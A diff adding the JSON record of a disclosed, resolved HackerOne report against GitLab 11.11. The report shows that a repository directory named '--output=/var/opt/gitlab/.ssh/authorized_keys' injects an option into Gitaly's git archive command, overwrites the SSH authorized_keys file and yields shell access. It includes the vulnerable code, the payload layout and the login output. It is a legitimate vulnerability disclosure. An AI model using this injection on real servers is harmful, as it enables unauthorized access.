@@ -1,0 +1,125 @@
+{
+  "id": 587854,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81ODc4NTQ=",
+  "url": "https://hackerone.com/reports/587854",
+  "title": "Local files could be overwritten in GitLab, leading to remote command execution",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2019-05-22T14:27:06.680Z",
+  "submitted_at": "2019-05-22T14:27:06.680Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "saltyyolk",
+    "url": "/saltyyolk",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/252/596/b03010470e2928f744f71fb5c1685806f1878341_original.jpeg/c8a1698ff707a5e3e8a91a3484838363845daac68cb82c86d55c9e2d44d67b67"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 264,
+    "url": "https://hackerone.com/gitlab",
+    "handle": "gitlab",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "GitLab",
+      "twitter_handle": "gitlab",
+      "website": "https://about.gitlab.com",
+      "about": "A single application for the entire software development lifecycle."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2019-07-17T00:23:37.470Z",
+  "bug_reporter_agreed_on_going_public_at": "2019-07-17T00:23:37.320Z",
+  "team_member_agreed_on_going_public_at": "2019-07-16T19:02:26.358Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "### Summary\n#### Arbitrary file overwrite\nA new feature (download a directory of a repository) in GitLab 11.11 introduced some changes in `./internal/service/repository/archive.go` of Gitaly.\n```go\nfunc handleArchive(ctx context.Context, writer io.Writer, in *gitalypb.GetArchiveRequest, compressCmd *exec.Cmd, format string, path string) error {                                                           \n        archiveCommand, err := git.Command(ctx, in.GetRepository(), \"archive\",                          \n                \"--format=\"+format, \"--prefix=\"+in.GetPrefix()+\"/\", in.GetCommitId(), path) \n...\n```\n\nA new parameter `path` is concatenated to the command, the parameter is supposed to carry the path of the directory to be downloaded in the repository. However, Gitaly could be misled by an attacker if the path starts with double dashes, for example:\n```shell\n$ tree\n.\n└── --output=\n    └── var\n        └── opt\n            └── gitlab\n                └── .ssh\n                    └── authorized_keys\n                        └── id_ed25519.pub\n```\n\nSuppose we have a repository which has only one file `id_ed25519.pub` (contains my pubkey) in directory `--output=/var/opt/gitlab/.ssh/authorized_keys/`. What happens in Gitaly when I click `download directory as tar` under this directory? The actual command get executed here is:\n```\ngit --git-dir=DIR_TO_REPO archive --format tar --prefix=/ COMMIT_ID --output=/var/opt/gitlab/.ssh/authorized_keys\n```\n\nThe content of the archive gets written to the `/var/opt/gitlab/.ssh/authorized_keys` file instead of transferred to the user.\n\n#### RCE\nThe reason I choose `tar` as the format is that `tar` doesn't compress the content, all contents in the repository are preserved with some tar headers concatenated into the output.\n\nIn the above example:\nContent of  `id_ed25519.pub`\n```\n#\nssh-ed25519 ██████\n#\n```\nContent of  the overwritten `authorized_keys`\n```\n~/workspace/gitlab/archive$ docker exec -ti e1a bash\nroot@localhost:/# cat /var/opt/gitlab/.ssh/authorized_keys \npax_global_header00006660000000000000000000000064134712530140014512gustar00rootroot0000000000000052 comment=412e285af38342030e5e30fcba77cb4296fb245d\narchive-master---output=-var-opt-gitlab-.ssh-authorized_keys/000077500000000000000000000000001347125301400244635ustar00rootroot00000000000000archive-master---output=-var-opt-gitlab-.ssh-authorized_keys/--output=/000077500000000000000000000000001347125301400262525ustar00rootroot00000000000000archive-master---output=-var-opt-gitlab-.ssh-authorized_keys/--output=/var/000077500000000000000000000000001347125301400270425ustar00rootroot00000000000000archive-master---output=-var-opt-gitlab-.ssh-authorized_keys/--output=/var/opt/000077500000000000000000000000001347125301400276445ustar00rootroot00000000000000archive-master---output=-var-opt-gitlab-.ssh-authorized_keys/--output=/var/opt/gitlab/000077500000000000000000000000001347125301400311065ustar00rootroot00000000000000archive-master---output=-var-opt-gitlab-.ssh-authorized_keys/--output=/var/opt/gitlab/.ssh/000077500000000000000000000000001347125301400317615ustar00rootroot00000000000000authorized_keys/000077500000000000000000000000001347125301400351135ustar00rootroot00000000000000archive-master---output=-var-opt-gitlab-.ssh-authorized_keys/--output=/var/opt/gitlab/.sshid_ed25519.pub000066400000000000000000000001661347125301400373000ustar00rootroot00000000000000archive-master---output=-var-opt-gitlab-.ssh-authorized_keys/--output=/var/opt/gitlab/.ssh/authorized_keys#\nssh-ed25519 ████████ \n#\n```\n\nSSH server allows dummy content in the `authorized_keys` file, as long as the public keys are started with a new line.\n\nSo, after the exploit:\n```\n$ ssh -i ~/.ssh/id_ed25519 git@10.26.0.3\n\nThe programs included with the Ubuntu system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nUbuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by\napplicable law.\n\n\nThe programs included with the Ubuntu system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nUbuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by\napplicable law.\n\n$ whoami\ngit\n$ \n```\n\n### Steps to reproduce\n\nAs stated above.\n\n### Impact\n\nFor most self-hosted single instance GitLab users, this is a RCE issue.\n\nFor those who has Gitaly running in different OS with gitlab-shell, the impact varies and depends on different circumstances.\n\nFor GitLab.com, as the described PoC is destructive and it's hard to observe if I choose some other files to overwrite. I didn't test and I want to leave the evaluation of impact to you guys. :p\n\n#### Results of GitLab environment info\n```\nroot@localhost:/# gitlab-rake gitlab:env:info\n\nSystem information\nSystem:\t\t\nCurrent User:\tgit\nUsing RVM:\tno\nRuby Version:\t2.5.3p105\nGem Version:\t2.7.9\nBundler Version:1.17.3\nRake Version:\t12.3.2\nRedis Version:\t3.2.12\nGit Version:\t2.21.0\nSidekiq Version:5.2.7\nGo Version:\tunknown\n\nGitLab information\nVersion:\t11.11.0\nRevision:\t3e8ca2fb781\nDirectory:\t/opt/gitlab/embedded/service/gitlab-rails\nDB Adapter:\tPostgreSQL\nDB Version:\t9.6.11\nURL:\t\thttp://10.26.0.3\nHTTP Clone URL:\thttp://10.26.0.3/some-group/some-project.git\nSSH Clone URL:\tgit@10.26.0.3:some-group/some-project.git\nUsing LDAP:\tno\nUsing Omniauth:\tyes\nOmniauth Providers: \n\nGitLab Shell\nVersion:\t9.1.0\nRepository storage paths:\n- default: \t/var/opt/gitlab/git-data/repositories\nGitLab Shell path:\t\t/opt/gitlab/embedded/service/gitlab-shell\nGit:\t\t/opt/gitlab/embedded/bin/git\n```\n\n## Impact\n\nOS command injections usually lead to serious results, remote code execution in this case.",
+  "bounty_amount": "12000.0",
+  "formatted_bounty": "$12,000",
+  "weakness": {
+    "id": 58,
+    "name": "Command Injection - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 540,
+  "voters": [
+    "mirchr",
+    "orange303",
+    "sky003",
+    "overjt",
+    "is-",
+    "0xsaltyhashes",
+    "n1m0",
+    "uceka_",
+    "sp1d3rs",
+    "p1stachios",
+    "and 530 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18138,
+    "asset_type": "URL",
+    "asset_identifier": "gitlab.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
